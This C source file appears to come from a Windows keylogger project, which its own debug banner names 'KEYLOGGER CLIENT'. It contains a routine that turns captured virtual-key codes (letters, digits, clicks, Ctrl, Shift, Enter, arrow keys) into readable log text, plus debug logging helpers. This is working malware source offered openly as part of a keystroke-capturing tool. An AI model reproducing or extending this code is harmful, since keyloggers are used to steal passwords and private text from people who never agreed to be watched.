#include "Definitions.h"

#include <Windows.h>
#include <stdio.h>
#include "Utils.h"


void TranslateVK(int character, char* output) {
	char temp_out[64];

	if(character >= VK_NUMPAD0 && character <= VK_NUMPAD9) {
		char character_str[2];
		character_str[0] = character - VK_NUMPAD0 + 0x30;
		character_str[1] = '\0';
		strcpy(temp_out, character_str);
	} else
	if(character >= 0x30 && character <= 0x5A ) {
		char character_str[2];
		character_str[0] = character;
		character_str[1] = '\0';
		strcpy(temp_out, character_str);
	}
	else 
	{
		switch (character)
		{
		case VK_LBUTTON: 
			strcpy(temp_out, " [Left Click] ");
			break;
		case VK_RBUTTON: 
			strcpy(temp_out, " [Right Click] ");
			break;
		case VK_CONTROL :
			strcpy(temp_out, " [CTRL] ");
			break;
		case VK_CAPITAL:
			strcpy(temp_out, " [CAPSLOCK] ");
			break;
		case VK_SHIFT:
			strcpy(temp_out, " [SHIFT] ");
			break;
		case VK_SPACE:
			strcpy(temp_out, " [SPACE] ");
			break;
		case VK_TAB:
			strcpy(temp_out, " [TAB] ");
			break;
		case VK_BACK:
			strcpy(temp_out, " [BACKSPACE] ");
			break;
		case VK_RETURN:
			strcpy(temp_out, " [ENTER] ");
			break;
		case VK_ESCAPE:
			strcpy(temp_out, " [ESC] ");
			break;
		case VK_HOME:
			strcpy(temp_out, " [HOME] ");
			break;
		case VK_LEFT:
			strcpy(temp_out, " [LEFT] ");
			break;
		case VK_RIGHT:
			strcpy(temp_out, " [RIGHT] ");
			break;
		case VK_UP:
			strcpy(temp_out, " [UP] ");
			break;
		case VK_DOWN:
			strcpy(temp_out, " [DOWN] ");
			break;
		case VK_MENU:
			strcpy(temp_out, " [ALT] ");
			break;
		default:
			strcpy(temp_out, "");
			break;
		}
	}

	strcpy(output, temp_out); // max 32 character
}



void log(char *msg) {
#ifdef DEBUG
	if(strcmp(msg, LOG_LINE) == 0)
		printf("\n");
	else
		printf("\t%s\n", msg);
#endif
}

void WelcomeMessage() {
#ifdef DEBUG
	char* message =
		"\n"
		"\t******************************************************\n"
		"\t**                         |                        **\n"
		"\t**               *********************              **\n"
		"\t**               *  KEYLOGGER CLIENT *              **\n"
		"\t**---------------*                   *--------------**\n"
		"\t**               *   ON DEBUG MODE   *              **\n"
		"\t**               *********************              **\n"
		"\t**                         |                        **\n"
		"\t******************************************************\n"
		;
	log(message); 
#endif 
}